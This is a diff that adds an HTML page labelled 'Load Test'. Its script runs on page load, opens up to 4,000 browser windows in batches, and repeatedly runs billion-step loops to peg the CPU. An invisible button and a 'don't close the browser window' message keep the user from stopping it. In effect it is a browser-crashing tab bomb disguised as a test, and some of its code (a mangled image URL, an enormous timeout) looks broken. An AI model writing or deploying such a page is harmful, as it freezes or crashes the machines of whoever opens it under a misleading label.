@@ -1,0 +1,160 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Load Test</title>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    width: 100vw;
+    height: 100vh;
+    overflow: hidden;
+    background-color: black;
+  }
+  #loadingButton {
+    position: fixed;
+    top: 50px;
+    left: 50px;
+    z-index: 9999;
+    background-color: #f00;
+    color: white;
+    font-size: 30px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    opacity: 0;
+  }
+  #loadingButton:active {
+    opacity: 1;
+  }
+  #modal {
+    display: none;
+    position: fixed;
+    z-index: 9998;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background-color: black;
+    opacity: 0.5;
+    justify-content: center;
+    align-items: center;
+  }
+  #modal-text {
+    color: white;
+    font-size: 30px;
+    margin: 0 auto;
+    text-align: center;
+  }
+</style>
+<body onload="startTest()">
+<div id="modal">
+  <p id="modal-text">Test in progress. Please don't close the browser window.</p>
+</div>
+<button id="loadingButton" onclick="toggleModal()">Open More Tabs</button>
+<script>
+  let tabCount = 0;
+  const maxTabs = 4000; // Adjusted the maximum number of tabs to 4,000 for safety
+  let currentTabs = 0;
+  let backgroundTasks = [];
+
+  function openTabs() {
+    for (let i = 0; i < 100; i++) {
+      let randomImageUrl = 'https://i.gifer.com/origin/98/981f2f195e7b896be152327f2965e721_w200.gif' + (currentTabs + 1) + 'x' + (currentTabs + 1) + '?city,night';
+      let tabUrl = 'about:blank';
+      let win = window.open(tabUrl, '_blank');
+      win.document.write('<html><head><title>Tab ' + currentTabs + '</title><meta charset="utf-8"></head><body><img src="' + randomImageUrl + '" style="width:100vw;height:100vh;"></body></html>');
+      win.document.close();
+      currentTabs++;
+      if (currentTabs < maxTabs) {
+        backgroundTasks.push(() => {
+          console.log('Background task: Opening ' + currentTabs + ' tabs');
+        });
+      }
+    }
+  }
+
+  function startTest() {
+    document.getElementById("modal").style.display = "flex";
+    setTimeout(() => {
+      for (let i = 0; i < 100; i++) {
+        openTabs();
+      }
+      // Run heavy background tasks
+      setInterval(() => {
+        backgroundTasks.forEach(task => task());
+      }, 100000);
+    }, 10000000);
+  }
+
+  function toggleModal() {
+    const modal = document.getElementById("modal");
+    const modalText = document.getElementById("modal-text");
+    if (modal.style.display === "flex") {
+      modal.style.display = "none";
+      modalText.textContent = "Test complete. Press to start again.";
+      document.getElementById("loadingButton").style.backgroundColor = "green";
+      document.getElementById("loadingButton").style.color = "white";
+      document.getElementById("loadingButton").style.padding = "10px 20px";
+      document.getElementById("loadingButton").style.fontSize = "20px";
+      document.getElementById("loadingButton").style.borderRadius = "5px";
+      document.getElementById("loadingButton").style.boxShadow = "0px 0px 10px 5px white";
+      document.getElementById("loadingButton").style.zIndex = "9997";
+      document.getElementById("loadingButton").style.top = "80px";
+      document.getElementById("loadingButton").style.left = "50px";
+      setTimeout(() => {
+        modal.style.display = "flex";
+        modalText.textContent = "Test in progress. Please don't close the browser window.";
+      }, 2000);
+    }
+  }
+
+  // Set up additional background tasks
+  setInterval(() => {
+    console.log('Background task running: ' + (new Date()).toString());
+    backgroundTasks.forEach(task => task());
+    // More heavy tasks like calculating large numbers or processing large data sets can be added here
+  }, 100);
+
+  // Function to calculate large numbers in the background
+  function heavyCalculation() {
+    const start = Date.now();
+    let result = 0;
+    for (let i = 0; i < 1000000000; i++) {
+      result += i;
+    }
+    console.log('Heavy calculation completed in ' + (Date.now() - start) + 'ms');
+  }
+
+  // Add heavyCalculation to backgroundTasks array
+  backgroundTasks.push(heavyCalculation);
+
+  // Add more heavy tasks if needed
+  // For example:
+  // function heavyDataProcessing() {
+  //   // Process large data sets or perform intensive operations
+  //   console.log('Heavy data processing started');
+  //   // ...
+  // }
+  // backgroundTasks.push(heavyDataProcessing);
+
+  // Run background tasks every second
+  setInterval(() => {
+    backgroundTasks.forEach(task => task());
+  }, 1000);
+
+  // Function to open tabs infinitely
+  function infiniteLoop() {
+    setInterval(() => {
+      if (currentTabs < maxTabs) {
+        openTabs();
+      }
+    }, 100);
+  }
+
+  // Call the infinite loop function
+  infiniteLoop();
+</script>
+</body>
+</html>
